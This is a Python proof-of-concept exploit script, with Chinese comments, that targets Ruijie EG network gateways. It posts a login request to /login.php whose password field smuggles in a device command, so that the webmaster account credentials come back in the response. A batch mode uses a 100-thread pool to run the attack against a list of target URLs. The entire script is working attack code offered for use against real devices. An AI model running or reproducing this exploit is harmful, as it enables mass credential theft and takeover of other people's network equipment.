# 锐捷EG 账号密码泄露
import argparse,sys,requests,re
from multiprocessing.dummy import Pool
def banner():
    # 定义横幅
    banner = """
         __  __     ______     __  __     ______     __  __     ______     __  __     ______    
        /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   
        \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  
         \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\ 
          \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/ 
                                                                                             
"""
    print(banner)
def main():
    banner()
    # 处理命令行输入的参数了吧
    # url file
    parser = argparse.ArgumentParser(description="锐捷EG 账号密码泄露")
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload_url = '/login.php'
    url = target+payload_url # 是从什么地方过来的 要么是你在命令输入的单个url 要么 文件里面读取到的
    header = {
        "Content-Length":"59",
        "Accept":"application/xml,text/xml,*/*;q=0.01",
        "X-Requested-With":"XMLHttpRequest",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type":"text/xml; charset=UTF-8",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Cookie":"language=zh-cn; language=zh-cn",
        "Connection":"close",
    }
    data = """username=admin&password=admin?show+webmaster+user"""
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    res1 = requests.get(url=target,headers=header,timeout=10)
    if res1.status_code == 200:
        try:
            response = requests.post(url=url, data=data, headers=header, timeout=10)
            print("正在执行 show users".format(url))
            if "data" in response.text and response.status_code == 200:
                print("成功获取, 响应为:{}".format(response.text))

        except Exception as e:
            print("请求失败:{}".format(e))
            sys.exit(0)


if __name__ == '__main__':
    main()